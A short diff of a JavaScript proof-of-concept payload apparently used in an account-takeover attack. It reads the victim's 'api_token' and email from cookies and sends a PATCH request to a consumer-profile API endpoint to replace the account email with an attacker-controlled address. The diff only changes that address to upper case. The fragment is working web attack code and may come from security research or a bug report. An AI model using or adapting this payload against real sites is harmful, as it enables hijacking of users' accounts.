@@ -10,7 +10,7 @@ token = getCookie('api_token');
 email = getCookie('name');
 email = email.replace('@', '%40').toUpperCase();
 
-newEmail = 'attackerpoc@gmail.com';
+newEmail = 'ATTACKERPOC@GMAIL.COM';
 
 var xhr = new XMLHttpRequest();
 xhr.open("PATCH", "/api/consumers/"+email+"/profile/v2", true);     
